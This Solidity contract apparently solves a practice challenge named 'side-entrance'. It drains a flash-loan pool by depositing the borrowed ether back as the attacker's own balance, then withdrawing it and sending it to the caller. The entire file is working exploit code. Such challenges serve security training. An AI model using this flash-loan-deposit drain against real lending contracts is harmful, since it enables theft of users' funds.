import "../side-entrance/SideEntranceLenderPool.sol";

import "../Ownable.sol";

contract AttackSideEntrance is Ownable {
    SideEntranceLenderPool pool;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
    }

    function attack(uint256 amount) external {
        //we first get the flashloan (which will deposit the money back into the contract)
        pool.flashLoan(amount);
        //we then withdraw it
        pool.withdraw();
        //and sent to money to the attack wallet
        payable(msg.sender).transfer(address(this).balance);
    }

    function execute() external payable {
        // our flshloan will deposit the amt into the flashloan contract
        pool.deposit{value: address(this).balance}();
    }
}
